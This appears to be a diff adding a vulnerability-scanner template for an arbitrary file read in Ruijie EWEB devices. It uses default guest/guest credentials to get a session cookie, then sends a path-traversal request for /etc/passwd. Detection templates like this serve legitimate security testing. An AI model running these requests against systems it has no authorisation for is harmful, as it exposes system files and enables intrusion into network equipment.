@@ -1,0 +1,41 @@
+id: ruijie-eweb-timeout-anyfile-read
+
+info:
+  name: Ruijie EWEB Timeout Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=guest&password=guest
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - "RUIJIEID=(.*?);"
+        internal: true
+
+  - raw:
+      - |
+        GET /check.php?url=../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: RUIJIEID={{cookie}};user=guest
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        negative: true
+        words:
+          - "<"
